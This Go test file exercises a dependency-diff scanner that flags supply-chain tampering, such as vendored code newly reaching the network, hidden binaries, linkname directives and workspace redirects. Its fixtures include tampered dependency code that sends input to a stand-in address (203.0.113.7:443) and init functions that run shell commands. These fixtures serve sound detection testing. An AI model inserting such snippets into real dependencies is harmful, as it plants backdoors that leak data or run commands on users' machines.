package api_test

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/BlackVectorOps/semantic_firewall/v6/pkg/api"
	"github.com/BlackVectorOps/semantic_firewall/v6/pkg/models"
)

// depsDiff runs DepsDiff and fails the test on an error.
func depsDiff(t *testing.T, oldDir, newDir string) *models.DepsDiffOutput {
	t.Helper()
	out, err := api.DepsDiff(oldDir, newDir)
	if err != nil {
		t.Fatalf("DepsDiff: %v", err)
	}
	return out
}

// unanalyzedKeys returns "kind change file" for each unanalyzed file of m.
func unanalyzedKeys(m models.ModuleDiff) map[string]int {
	out := make(map[string]int)
	for _, fc := range m.Unanalyzed {
		out[fc.Kind+" "+fc.Change+" "+fc.File] = fc.RiskScore
	}
	return out
}

// A tree with a vendor directory builds its dependencies from it, whatever
// the module cache holds: vendored code is compared by content.
func TestDepsDiff_Vendored(t *testing.T) {
	proxy := moduleProxy(t, map[string]map[string]string{
		"example.com/dep@v1.0.0": {
			"go.mod": "module example.com/dep\n\ngo 1.22\n",
			"d/d.go": "package d\n\nfunc Decode(s string) string { return s }\n",
		},
	})
	vendored := func() string {
		dir := t.TempDir()
		writeFilesIn(t, dir, map[string]string{
			"go.mod":  "module example.com/app\n\ngo 1.22\n\nrequire example.com/dep v1.0.0\n",
			"main.go": "package main\n\nimport \"example.com/dep/d\"\n\nfunc main() { println(d.Decode(\"x\")) }\n",
		})
		tidy(t, dir, proxy)
		cmd := exec.Command(filepath.Join(runtime.GOROOT(), "bin", "go"), "mod", "vendor")
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GOPROXY="+proxy, "GOSUMDB=off", "GOFLAGS=-mod=mod", "GOTOOLCHAIN=local", "GOWORK=off")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("go mod vendor: %v\n%s", err, out)
		}
		return dir
	}
	oldDir, newDir := vendored(), vendored()

	t.Run("unchanged", func(t *testing.T) {
		if out := depsDiff(t, oldDir, vendored()); len(out.Modules) != 0 {
			t.Errorf("modules = %+v; want none", out.Modules)
		}
	})
	t.Run("tampered vendor copy", func(t *testing.T) {
		writeFilesIn(t, newDir, map[string]string{"vendor/example.com/dep/d/d.go": `package d

import "net"

func Decode(s string) string {
	if c, err := net.Dial("tcp", "203.0.113.7:443"); err == nil {
		c.Write([]byte(s))
	}
	return s
}
`})
		m := findModule(t, depsDiff(t, oldDir, newDir), "example.com/dep")
		if m.Status != models.ModuleUpdated || m.OldVersion != "v1.0.0" || m.NewVersion != "v1.0.0" ||
			len(m.Reach) != 1 || m.Reach[0].Function != "example.com/dep/d.Decode" || m.RiskScore < models.RiskScoreHigh {
			t.Errorf("module = %+v; want an updated v1.0.0 whose Decode newly reaches the network", m)
		}
	})
}

// Files the build uses that a name-and-place inventory would miss: a
// symbolic link to a .syso or .s file, a file an assembly file includes from
// elsewhere, and, in a cgo module, machine code under any name.
func TestDepsDiff_HiddenUnanalyzedFiles(t *testing.T) {
	deps := map[string]string{"example.com/native": "native"}
	imports := "\t_ \"example.com/native/n\"\n\t_ \"example.com/native/a\"\n\t_ \"example.com/native/c\"\n"
	elf := "\x7fELF\x02\x01\x01"
	tree := func(v string) string {
		return appTree(t, imports, deps, map[string]string{
			"lib/native/n/n.go":           "package n\n\nfunc N() int { return 1 }\n",
			"lib/native/blobs/payload":    "precompiled object " + v,
			"lib/native/blobs/impl":       "// assembly " + v + "\n",
			"lib/native/a/a.go":           "package a\n\n// Add is implemented in assembly.\nfunc Add(x, y int64) int64\n",
			"lib/native/a/add_amd64.s":    "#include \"textflag.h\"\n#include \"../impl/add.inc\"\n",
			"lib/native/impl/add.inc":     "#include \"more.inc\"\n// " + v + "\n",
			"lib/native/impl/more.inc":    "// " + v + "\n",
			"lib/native/c/c.go":           "package c\n\n// #cgo LDFLAGS: -L${SRCDIR}/../objs -l:payload.bin\nimport \"C\"\n",
			"lib/native/c/plain.go":       "package c\n\nfunc C() int { return 1 }\n",
			"lib/native/objs/payload.bin": elf + v,
			"lib/native/objs/notes":       "notes " + v,
			"lib/native/c/UPPER.S":        "// " + v + "\n",
			"lib/native/c/UPPER.SYSO":     v,
		})
	}
	oldDir, newDir := tree("v1"), tree("v2")
	for _, dir := range []string{oldDir, newDir} {
		pkg := filepath.Join(dir, "..", "lib", "native", "n")
		if err := os.Symlink("../blobs/payload", filepath.Join(pkg, "rsrc.syso")); err != nil {
			t.Skip(err)
		}
		if err := os.Symlink("../blobs/impl", filepath.Join(pkg, "stub.s")); err != nil {
			t.Fatal(err)
		}
	}
	// A symbolic link to something other than a regular file is not read.
	if err := os.Symlink(os.DevNull, filepath.Join(newDir, "..", "lib", "native", "n", "dev.syso")); err != nil {
		t.Fatal(err)
	}

	got := unanalyzedKeys(findModule(t, depsDiff(t, oldDir, newDir), "example.com/native"))
	want := map[string]int{
		"syso modified n/rsrc.syso":        20,
		"assembly modified n/stub.s":       5,
		"assembly modified impl/add.inc":   5,
		"assembly modified impl/more.inc":  5,
		"object modified objs/payload.bin": 20,
		"other modified objs/notes":        5,
		"other modified blobs/payload":     5,
		"other modified blobs/impl":        5,
		"assembly modified c/UPPER.S":      5,
		"syso modified c/UPPER.SYSO":       20,
	}
	for k, risk := range want {
		if r, ok := got[k]; !ok || r != risk {
			t.Errorf("%s: risk %d, reported %v; want risk %d", k, r, ok, risk)
		}
	}
	for k := range got {
		if strings.Contains(k, "dev.syso") {
			t.Errorf("a link to a device is listed: %s", k)
		}
	}
}

// //go:linkname directives come from the parsed comments of every Go file
// of a package, compiled or not, and are keyed by package.
func TestDepsDiff_Linknames(t *testing.T) {
	imports := "\t_ \"example.com/lib/codec\"\n"
	deps := map[string]string{"example.com/lib": "lib"}
	link := "package codec\n\nimport _ \"unsafe\"\n\n//go:linkname nanotime runtime.nanotime\nfunc nanotime() int64\n"
	const key = "linkname added example.com/lib/codec: //go:linkname nanotime runtime.nanotime"
	tree := func(files map[string]string) string {
		all := map[string]string{"lib/lib/codec/codec.go": codecV1}
		for k, v := range files {
			all[k] = v
		}
		return appTree(t, imports, deps, all)
	}
	other := "windows"
	if runtime.GOOS == "windows" {
		other = "linux"
	}
	cases := []struct {
		name     string
		old, new map[string]string
		want     bool // the directive is reported as added
	}{
		{"after a line longer than a scanner buffer", nil,
			map[string]string{"lib/lib/codec/link.go": "// " + strings.Repeat("x", 5<<20) + "\n" + link}, true},
		{"in a file only a cgo build compiles", nil,
			map[string]string{"lib/lib/codec/rt_cgo.go": "package codec\n\n// #include <stdlib.h>\nimport \"C\"\n" + strings.TrimPrefix(link, "package codec\n")}, true},
		{"in another platform's file", nil,
			map[string]string{"lib/lib/codec/rt_" + other + ".go": link}, true},
		{"switched on from inside a block comment",
			map[string]string{"lib/lib/codec/clock.go": "package codec\n\n/*\n//go:linkname nanotime runtime.nanotime\n*/\n\nfunc nanotime() int64 { return 0 }\n"},
			map[string]string{"lib/lib/codec/clock.go": link}, true},
		{"its file renamed",
			map[string]string{"lib/lib/codec/time.go": link},
			map[string]string{"lib/lib/codec/clock.go": link}, false},
		{"re-spaced",
			map[string]string{"lib/lib/codec/time.go": link},
			map[string]string{"lib/lib/codec/time.go": strings.Replace(link, "nanotime runtime", "nanotime\truntime", 1)}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := depsDiff(t, tree(c.old), tree(c.new))
			var got map[string]int
			for _, m := range out.Modules {
				got = unanalyzedKeys(m)
			}
			if _, ok := got[key]; ok != c.want {
				t.Errorf("unanalyzed = %v; want the directive added: %v", got, c.want)
			}
			if !c.want {
				for k := range got {
					if strings.HasPrefix(k, "linkname") {
						t.Errorf("unexpected %s", k)
					}
				}
			}
		})
	}

	t.Run("in an added module's excluded file", func(t *testing.T) {
		newDir := appTree(t, imports, deps, map[string]string{
			"lib/lib/codec/codec.go":            codecV1,
			"lib/lib/codec/rt_" + other + ".go": link,
		})
		m := findModule(t, depsDiff(t, appTree(t, "", nil, nil), newDir), "example.com/lib")
		if r := unanalyzedKeys(m)[key]; r != models.RiskScoreHigh || m.Status != models.ModuleAdded || m.RiskScore != models.RiskScoreHigh {
			t.Errorf("module = %+v; want added with the directive at risk %d", m, models.RiskScoreHigh)
		}
	})
}

// Entry points are the method sets of exported types: promoted methods and
// methods named through an exported alias count.
func TestDepsDiff_EntryPointMethodSets(t *testing.T) {
	imports := "\t_ \"example.com/lib/d\"\n"
	deps := map[string]string{"example.com/lib": "lib"}
	src := func(body string) string {
		return `package d

import "net"

type Client struct{ conn }

type conn struct{}

func (conn) Send(b []byte) int { ` + body + `return len(b) }

type Conn = rawConn

type rawConn struct{}

func (*rawConn) Write(b []byte) int { ` + body + `return len(b) }

type hidden struct{}

func (hidden) Leak() { ` + body + `}

func Ping() { dial() }

func dial() { net.Dial("tcp", "203.0.113.7:443") }
`
	}
	m := findModule(t, depsDiff(t,
		appTree(t, imports, deps, map[string]string{"lib/lib/d/d.go": src("")}),
		appTree(t, imports, deps, map[string]string{"lib/lib/d/d.go": src("dial(); ")})), "example.com/lib")
	var names []string
	for _, r := range m.Reach {
		names = append(names, r.Function)
	}
	want := []string{"example.com/lib/d.(*Conn).Write", "example.com/lib/d.(Client).Send"}
	if fmt.Sprint(names) != fmt.Sprint(want) || m.RiskScore != 20 {
		t.Errorf("reach = %v, risk %d; want %v, risk 20 (the unexported type's method is no entry point)", names, m.RiskScore, want)
	}
}

// Reach from an initializer stops at other packages' initializers, which
// are entry points of their own: importing an already-built package runs
// nothing new. Reach is computed over strongly connected components: a
// call cycle reaches what any of its functions calls.
func TestDepsDiff_ReachBoundaries(t *testing.T) {
	imports := "\t_ \"example.com/lib/a\"\n\t_ \"example.com/lib/transport\"\n"
	deps := map[string]string{"example.com/lib": "lib"}
	transport := "package transport\n\nimport \"net\"\n\nvar Dial = net.Dial\n\nconst Name = \"tcp\"\n"
	t.Run("an already-built package imported", func(t *testing.T) {
		out := depsDiff(t,
			appTree(t, imports, deps, map[string]string{
				"lib/lib/transport/transport.go": transport,
				"lib/lib/a/a.go":                 "package a\n\nfunc Network() string { return \"tcp\" }\n",
			}),
			appTree(t, imports, deps, map[string]string{
				"lib/lib/transport/transport.go": transport,
				"lib/lib/a/a.go":                 "package a\n\nimport \"example.com/lib/transport\"\n\nfunc Network() string { return transport.Name }\n",
			}))
		if m := findModule(t, out, "example.com/lib"); len(m.Reach) != 0 || m.RiskScore >= models.RiskScoreHigh {
			t.Errorf("module = %+v; want no reach change", m)
		}
	})
	t.Run("a new package's initializer", func(t *testing.T) {
		r := "package r\n\nimport (\"net\";\"os/exec\")\n\nfunc Run() { net.Dial(\"tcp\", \"x:1\"); exec.Command(\"id\").Run() }\n"
		out := depsDiff(t,
			appTree(t, "\t_ \"example.com/lib/r\"\n", deps, map[string]string{"lib/lib/r/r.go": r}),
			appTree(t, "\t_ \"example.com/lib/r\"\n\t_ \"example.com/lib/b\"\n", deps, map[string]string{
				"lib/lib/r/r.go": r,
				"lib/lib/b/b.go": "package b\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"id\").Run() }\n",
			}))
		m := findModule(t, out, "example.com/lib")
		reach := map[string]models.ReachChange{}
		for _, r := range m.Reach {
			reach[r.Function] = r
		}
		if r := reach["example.com/lib/b.init"]; r.RiskScore != 40 || fmt.Sprint(r.Added) != "[exec]" {
			t.Errorf("b.init reach = %+v; want exec, risk 40", r)
		}
		if len(reach) != 1 {
			t.Errorf("reach = %+v; want b.init only", m.Reach)
		}
	})
	t.Run("an entry newly reaching two classes", func(t *testing.T) {
		src := "package r\n\nimport (\"net\";\"os/exec\")\n\nfunc Run(n int) { ping(n) }\n\nfunc ping(n int) { if n > 0 { pong(n - 1) } }\n\nfunc pong(n int) { %s ping(n) }\n\nvar _, _ = net.Dial, exec.Command\n"
		m := findModule(t, depsDiff(t,
			appTree(t, "\t_ \"example.com/lib/r\"\n", deps, map[string]string{"lib/lib/r/r.go": fmt.Sprintf(src, "")}),
			appTree(t, "\t_ \"example.com/lib/r\"\n", deps, map[string]string{"lib/lib/r/r.go": fmt.Sprintf(src, "net.Dial(\"tcp\", \"x:1\"); exec.Command(\"id\").Run();")}),
		), "example.com/lib")
		if len(m.Reach) != 1 || m.Reach[0].Function != "example.com/lib/r.Run" || fmt.Sprint(m.Reach[0].Added) != "[exec network]" || m.Reach[0].RiskScore != 30 {
			t.Errorf("reach = %+v; want Run newly reaching exec and network through the cycle, risk 30", m.Reach)
		}
	})
}

// A package the new tree newly builds from a module whose version did not
// change is new code, reported like an added module's.
func TestDepsDiff_NewPackageOfUnchangedModule(t *testing.T) {
	proxy := moduleProxy(t, map[string]map[string]string{
		"example.com/m@v1.0.0": {
			"go.mod": "module example.com/m\n\ngo 1.22\n",
			"a/a.go": "package a\n\nimport _ \"unsafe\"\n\n//go:linkname nanotime runtime.nanotime\nfunc nanotime() int64\n\nfunc A() int64 { return nanotime() }\n",
			"b/b.go": "package b\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"id\").Run() }\n\nfunc B() {}\n",
		},
	})
	app := func(imports string) string {
		dir := t.TempDir()
		writeFilesIn(t, dir, map[string]string{
			"go.mod":  "module example.com/app\n\ngo 1.22\n\nrequire example.com/m v1.0.0\n",
			"main.go": "package main\n\nimport (\n" + imports + ")\n\nfunc main() {}\n",
		})
		tidy(t, dir, proxy)
		return dir
	}
	oldDir := app("\t_ \"example.com/m/a\"\n")
	if out := depsDiff(t, oldDir, app("\t_ \"example.com/m/a\"\n")); len(out.Modules) != 0 {
		t.Errorf("same packages: modules = %+v; want none", out.Modules)
	}
	out := depsDiff(t, oldDir, app("\t_ \"example.com/m/a\"\n\t_ \"example.com/m/b\"\n"))
	m := findModule(t, out, "example.com/m")
	// a's linkname was built before: only b is new.
	if m.Status != models.ModuleUpdated || m.OldVersion != "v1.0.0" || m.NewVersion != "v1.0.0" ||
		fmt.Sprint(m.Capabilities) != "[exec]" || len(m.Reach) != 1 || m.Reach[0].Function != "example.com/m/b.init" ||
		m.RiskScore != 40 || len(m.Packages) != 0 || len(m.Unanalyzed) != 0 {
		t.Errorf("module = %+v; want v1.0.0 with b's exec-running init reported, risk 40", m)
	}
	if want := (models.DepsDiffSummary{ModulesUpdated: 1, HighRiskChanges: 1}); out.Summary != want {
		t.Errorf("summary = %+v; want %+v", out.Summary, want)
	}
}

// The tree's own module is not a dependency, whatever packages it adds.
func TestDepsDiff_OwnModule(t *testing.T) {
	oldDir := appTree(t, "", nil, nil)
	newDir := appTree(t, "\t_ \"example.com/app/tool\"\n", nil, map[string]string{
		"app/tool/tool.go": "package tool\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"id\").Run() }\n",
	})
	if out := depsDiff(t, oldDir, newDir); len(out.Modules) != 0 {
		t.Errorf("modules = %+v; want none", out.Modules)
	}
	if _, err := api.DepsDiff(filepath.Join(t.TempDir(), "missing"), newDir); err == nil || !strings.Contains(err.Error(), "old tree") {
		t.Errorf("a missing tree: err = %v; want an old-tree load error", err)
	}
}

// Removed and added modules report the replacement the build used.
func TestDepsDiff_ReplacedModuleVersions(t *testing.T) {
	deps := map[string]string{"example.com/x": "x"}
	files := map[string]string{"lib/x/x/x.go": "package x\n\nfunc X() int { return 1 }\n"}
	with, without := appTree(t, "\t_ \"example.com/x/x\"\n", deps, files), appTree(t, "", deps, files)
	if m := findModule(t, depsDiff(t, with, without), "example.com/x"); m.Status != models.ModuleRemoved || m.OldVersion != "replace ../lib/x" {
		t.Errorf("removed module = %+v; want old version \"replace ../lib/x\"", m)
	}
	if m := findModule(t, depsDiff(t, without, with), "example.com/x"); m.Status != models.ModuleAdded || m.NewVersion != "replace ../lib/x" {
		t.Errorf("added module = %+v; want new version \"replace ../lib/x\"", m)
	}
}

// mkfifo makes a named pipe, or skips the test where it cannot.
func mkfifo(t *testing.T, path string) {
	t.Helper()
	if out, err := exec.Command("mkfifo", path).CombinedOutput(); err != nil {
		t.Skipf("mkfifo: %v %s", err, out)
	}
}

// pe returns a minimal PE header: "MZ", e_lfanew at 0x3c pointing at off,
// and sig at off, padded to size.
func pe(off int, sig string, size int) string {
	b := make([]byte, max(size, off+len(sig)))
	copy(b, "MZ")
	b[0x3c] = byte(off)
	copy(b[off:], sig)
	return string(b)
}

// The inventory reads only regular files, tells machine code by its
// header, skips version-control directories, and treats an excluded Go
// file that does not parse as excluded, not as cgo.
func TestDepsDiff_InventoryEdges(t *testing.T) {
	deps := map[string]string{"example.com/native": "native"}
	imports := "\t_ \"example.com/native/n\"\n\t_ \"example.com/native/c\"\n"
	other := "windows"
	if runtime.GOOS == "windows" {
		other = "linux"
	}
	tree := func(v string) string {
		return appTree(t, imports, deps, map[string]string{
			"lib/native/n/n.go": "package n\n\nfunc N() int { return 1 }\n",
			// The import block does not parse; a partial parse still holds "C".
			"lib/native/n/bad.go":                  "//go:build ignore\n\npackage n\n\nimport \"C\"\n\nimport ( // " + v + "\n",
			"lib/native/n/n_" + other + "_test.go": "package n\n\nimport _ \"unsafe\"\n\n//go:linkname nt" + v + " runtime.nanotime\nfunc nt" + v + "() int64\n",
			"lib/native/n/z_" + other + ".c":       "//go:linkname nt" + v + " runtime.nanotime\nint z;\n",
			"lib/native/c/c.go":                    "package c\n\n// #cgo LDFLAGS: -L${SRCDIR}/../objs\nimport \"C\"\n",
			"lib/native/c/plain.go":                "package c\n\nfunc C() int { return 1 }\n",
			"lib/native/objs/pe":                   pe(0x40, "PE\x00\x00"+v, 0x48),
			"lib/native/objs/pe64":                 pe(0x30, "PE\x00\x00"+v, 0x40), // exactly the header's length
			"lib/native/objs/badsig":               pe(0x40, "XX\x00\x00"+v, 0x48),
			"lib/native/objs/far":                  pe(0x40, "", 0x40)[:0x3c] + "\xff\xff\x00\x00" + v,
			"lib/native/objs/mzshort":              "MZ" + v,
			"lib/native/.git/HEAD":                 "ref: " + v,
		})
	}
	oldDir, newDir := tree("v1"), tree("v2")
	pkg := filepath.Join(newDir, "..", "lib", "native", "n")
	if err := os.Symlink("gone.bin", filepath.Join(pkg, "gone.syso")); err != nil {
		t.Skip(err)
	}
	// go list -compiled itself blocks on a pipe named .go, .s, .h or .syso;
	// neither git nor a module zip can hold one. It leaves .o files alone.
	mkfifo(t, filepath.Join(pkg, "pipe.o"))
	mkfifo(t, filepath.Join(newDir, "..", "lib", "native", "objs", "pipe"))

	got := unanalyzedKeys(findModule(t, depsDiff(t, oldDir, newDir), "example.com/native"))
	want := map[string]int{
		"excluded-go modified n/bad.go":  5,
		"c modified n/z_" + other + ".c": 5,
		"object modified objs/pe":        20,
		"object modified objs/pe64":      20,
		"other modified objs/badsig":     5,
		"other modified objs/far":        5,
		"other modified objs/mzshort":    5,
	}
	for k, risk := range want {
		if r, ok := got[k]; !ok || r != risk {
			t.Errorf("%s: risk %d, reported %v; want risk %d", k, r, ok, risk)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unanalyzed = %v; want exactly %v (no pipes, dangling links, .git, tests, compiled files, or linknames of tests and C files)", got, want)
	}
}

// Every file an assembly file includes counts, however the directive is
// spaced, by a relative or absolute path, through include cycles, and
// never a pipe.
func TestDepsDiff_AssemblyIncludes(t *testing.T) {
	deps := map[string]string{"example.com/asm": "asm"}
	imports := "\t_ \"example.com/asm/p\"\n"
	tree := func(v string) string {
		return appTree(t, imports, deps, map[string]string{
			"lib/asm/p/p.go":       "package p\n\n// Add is implemented in assembly.\nfunc Add(a, b int64) int64\n",
			"lib/asm/impl/a.inc":   "#include \"b.inc\"\n// " + v + "\n",
			"lib/asm/impl/b.inc":   "#include \"a.inc\"\n// " + v + "\n",
			"lib/asm/impl/sp.inc":  "// " + v + "\n",
			"lib/asm/impl/abs.inc": "// " + v + "\n",
			"lib/asm/impl/not.inc": "// " + v + "\n",
		})
	}
	oldDir, newDir := tree("v1"), tree("v2")
	for _, dir := range []string{oldDir, newDir} {
		impl, err := filepath.Abs(filepath.Join(dir, "..", "lib", "asm", "impl"))
		if err != nil {
			t.Fatal(err)
		}
		mkfifo(t, filepath.Join(impl, "pipe.inc"))
		src := "#include \"textflag.h\"\n#include \"../impl/a.inc\"\n  #  include \"../impl/sp.inc\"\n" +
			"#include \"" + filepath.ToSlash(filepath.Join(impl, "abs.inc")) + "\"\n#include \"../impl/pipe.inc\"\n" +
			"// #include \"../impl/not.inc\" is a comment\nDATA ·s+0(SB)/8, $\"../impl/not.inc\"\n"
		writeFilesIn(t, filepath.Join(dir, "..", "lib", "asm", "p"), map[string]string{"add_amd64.s": src})
	}
	got := unanalyzedKeys(findModule(t, depsDiff(t, oldDir, newDir), "example.com/asm"))
	want := map[string]int{
		"assembly modified p/add_amd64.s": 5, // it names each tree's own absolute path
		"assembly modified impl/a.inc":    5,
		"assembly modified impl/b.inc":    5,
		"assembly modified impl/sp.inc":   5,
		"assembly modified impl/abs.inc":  5,
	}
	for k, risk := range want {
		if r, ok := got[k]; !ok || r != risk {
			t.Errorf("%s: risk %d, reported %v; want risk %d", k, r, ok, risk)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unanalyzed = %v; want exactly %v", got, want)
	}
}

// Reach is shared around a call cycle whatever function the walk enters
// it by; an initializer's reach stops at other packages' initializers
// even when theirs was computed first; methods outside the exported API
// and types with no single body are no entry points; an added module's
// exported functions show in its capabilities, not its reach.
func TestDepsDiff_ReachGraph(t *testing.T) {
	deps := map[string]string{"example.com/lib": "lib"}
	t.Run("a call cycle", func(t *testing.T) {
		src := func(dial string) string {
			return "package g\n\nimport \"net\"\n\nfunc A() { a(3) }\n\nfunc C() { c(3) }\n\n" +
				"func a(n int) { b(n); " + dial + " }\n\nfunc b(n int) { c(n) }\n\nfunc c(n int) { if n > 0 { a(n - 1) } }\n\nvar _ = net.Dial\n"
		}
		imports := "\t_ \"example.com/lib/g\"\n"
		m := findModule(t, depsDiff(t,
			appTree(t, imports, deps, map[string]string{"lib/lib/g/g.go": src("")}),
			appTree(t, imports, deps, map[string]string{"lib/lib/g/g.go": src("net.Dial(\"tcp\", \"x:1\")")})), "example.com/lib")
		var names []string
		for _, r := range m.Reach {
			names = append(names, r.Function)
		}
		if fmt.Sprint(names) != "[example.com/lib/g.A example.com/lib/g.C]" {
			t.Errorf("reach = %v; want A and C", names)
		}
	})
	t.Run("an initializer computed first", func(t *testing.T) {
		imports := "\t_ \"example.com/lib/a\"\n\t_ \"example.com/lib/b\"\n"
		dialer := "package a\n\nimport \"net\"\n\nvar Dial = net.Dial\n\nconst Name = \"tcp\"\n"
		m := findModule(t, depsDiff(t,
			appTree(t, imports, deps, map[string]string{
				"lib/lib/a/a.go": dialer,
				"lib/lib/b/b.go": "package b\n\nfunc Network() string { return \"tcp\" }\n",
			}),
			appTree(t, imports, deps, map[string]string{
				"lib/lib/a/a.go": dialer,
				"lib/lib/b/b.go": "package b\n\nimport \"example.com/lib/a\"\n\nfunc Network() string { return a.Name }\n",
			})), "example.com/lib")
		if len(m.Reach) != 0 {
			t.Errorf("reach = %+v; want none", m.Reach)
		}
	})
	t.Run("what is no entry point", func(t *testing.T) {
		imports := "\t_ \"example.com/lib/d\"\n"
		src := func(body string) string {
			return "package d\n\nimport (\"bytes\";\"net\")\n\n" +
				"type Client struct{}\n\nfunc (c *Client) send() { " + body + " }\n\nfunc (c *Client) Close() {}\n\n" +
				"type Doer interface{ Do() }\n\ntype Box[T any] struct{ v T }\n\nfunc (b Box[T]) Get() T { " + body + " return b.v }\n\n" +
				"type Handler = func()\n\ntype Buf = bytes.Buffer\n\nvar _ = net.Dial\n"
		}
		m := findModule(t, depsDiff(t,
			appTree(t, imports, deps, map[string]string{"lib/lib/d/d.go": src("")}),
			appTree(t, imports, deps, map[string]string{"lib/lib/d/d.go": src("net.Dial(\"tcp\", \"x:1\");")})), "example.com/lib")
		if len(m.Reach) != 0 {
			t.Errorf("reach = %+v; want none", m.Reach)
		}
	})
	t.Run("an added module's exported functions", func(t *testing.T) {
		m := findModule(t, depsDiff(t, appTree(t, "", nil, nil),
			appTree(t, "\t_ \"example.com/lib/p\"\n", deps, map[string]string{
				"lib/lib/p/p.go": "package p\n\nimport \"net\"\n\nfunc Ping() { net.Dial(\"tcp\", \"x:1\") }\n",
			})), "example.com/lib")
		if fmt.Sprint(m.Capabilities) != "[network]" || len(m.Reach) != 0 || m.RiskScore != 0 {
			t.Errorf("module = %+v; want network capability, no reach entry, risk 0", m)
		}
	})
}

// A tree builds with the go.work that governs it, as the go command does.
// A `use` of a directory whose go.mod takes a dependency's path redirects
// the dependency there, and is reported as that dependency replaced; the
// other modules of the workspace are compared like local replacements.
func TestDepsDiff_Workspace(t *testing.T) {
	proxy := moduleProxy(t, map[string]map[string]string{
		"example.com/dep@v1.0.0": {
			"go.mod": "module example.com/dep\n\ngo 1.22\n",
			"d/d.go": "package d\n\nfunc Decode(s string) string { return s }\n",
		},
	})
	app := map[string]string{
		"app/go.mod":  "module example.com/app\n\ngo 1.22\n\nrequire example.com/dep v1.0.0\n",
		"app/main.go": "package main\n\nimport \"example.com/dep/d\"\n\nfunc main() { println(d.Decode(\"x\")) }\n",
	}
	tree := func(files map[string]string) string {
		root := t.TempDir()
		writeFilesIn(t, root, app)
		tidy(t, filepath.Join(root, "app"), proxy)
		writeFilesIn(t, root, files)
		return filepath.Join(root, "app")
	}

	t.Run("a use redirects a dependency", func(t *testing.T) {
		oldDir := tree(nil)
		newDir := tree(map[string]string{
			"go.work":       "go 1.22\n\nuse (\n\t./app\n\t./shadow\n)\n",
			"shadow/go.mod": "module example.com/dep\n\ngo 1.22\n",
			"shadow/d/d.go": "package d\n\nimport \"net\"\n\nfunc Decode(s string) string {\n\tnet.Dial(\"tcp\", \"203.0.113.7:443\")\n\treturn s\n}\n",
		})
		out := depsDiff(t, oldDir, newDir)
		dep := findModule(t, out, "example.com/dep")
		if dep.Status != models.ModuleUpdated || dep.OldVersion != "v1.0.0" || dep.NewVersion != "use ./shadow" {
			t.Errorf("dep: %s %s -> %s; want updated v1.0.0 -> use ./shadow", dep.Status, dep.OldVersion, dep.NewVersion)
		}
		if dep.HighRiskChanges == 0 || out.Summary.HighRiskChanges == 0 {
			t.Errorf("the redirected Decode, which now dials out, is not high risk: %+v", dep)
		}
	})

	sibling := func(body string) map[string]string {
		return map[string]string{
			"go.work":    "go 1.22\n\nuse (\n\t./app\n\t./lib\n)\n",
			"app/use.go": "package main\n\nimport \"example.com/lib\"\n\nvar _ = lib.Run\n",
			"lib/go.mod": "module example.com/lib\n\ngo 1.22\n",
			"lib/lib.go": "package lib\n\nimport \"os/exec\"\n\nvar _ = exec.Command\n\nfunc Run() { " + body + " }\n",
		}
	}
	t.Run("an unchanged workspace module", func(t *testing.T) {
		if out := depsDiff(t, tree(sibling("")), tree(sibling(""))); len(out.Modules) != 0 {
			t.Errorf("modules = %+v; want none", out.Modules)
		}
	})
	t.Run("a changed workspace module", func(t *testing.T) {
		out := depsDiff(t, tree(sibling("")), tree(sibling(`exec.Command("sh").Run()`)))
		lib := findModule(t, out, "example.com/lib")
		if lib.OldVersion != "use ./lib" || lib.NewVersion != "use ./lib" || len(lib.Packages) == 0 || lib.HighRiskChanges == 0 {
			t.Errorf("lib: %s -> %s, %d packages, %d high-risk changes; want its changed Run, high risk", lib.OldVersion, lib.NewVersion, len(lib.Packages), lib.HighRiskChanges)
		}
	})
	t.Run("a vendored workspace", func(t *testing.T) {
		vendored := func() string {
			dir := tree(map[string]string{"go.work": "go 1.22\n\nuse ./app\n"})
			cmd := exec.Command(filepath.Join(runtime.GOROOT(), "bin", "go"), "work", "vendor")
			cmd.Dir = filepath.Dir(dir)
			cmd.Env = append(os.Environ(), "GOPROXY="+proxy, "GOSUMDB=off", "GOFLAGS=-mod=mod", "GOTOOLCHAIN=local", "GOWORK="+filepath.Join(filepath.Dir(dir), "go.work"))
			if out, err := cmd.CombinedOutput(); err != nil {
				t.Fatalf("go work vendor: %v\n%s", err, out)
			}
			return dir
		}
		oldDir, newDir := vendored(), vendored()
		writeFilesIn(t, filepath.Dir(newDir), map[string]string{
			"vendor/example.com/dep/d/d.go": "package d\n\nimport \"os/exec\"\n\nfunc Decode(s string) string {\n\texec.Command(s).Run()\n\treturn s\n}\n",
		})
		dep := findModule(t, depsDiff(t, oldDir, newDir), "example.com/dep")
		if len(dep.Packages) == 0 || dep.HighRiskChanges == 0 {
			t.Errorf("the tampered workspace vendor copy: %d packages, %d high-risk changes", len(dep.Packages), dep.HighRiskChanges)
		}
	})
	t.Run("a use outside the workspace's directory", func(t *testing.T) {
		outer := tree(nil)
		ext := filepath.Join(filepath.Dir(filepath.Dir(outer)), "ext")
		writeFilesIn(t, ext, map[string]string{
			"go.mod": "module example.com/dep\n\ngo 1.22\n",
			"d/d.go": "package d\n\nfunc Decode(s string) string { return s + s }\n",
		})
		writeFilesIn(t, filepath.Dir(outer), map[string]string{"go.work": "go 1.22\n\nuse (\n\t./app\n\t../ext\n)\n"})
		dep := findModule(t, depsDiff(t, tree(nil), outer), "example.com/dep")
		if dep.NewVersion != "use ../ext" {
			t.Errorf("dep: -> %s; want use ../ext", dep.NewVersion)
		}
	})
}
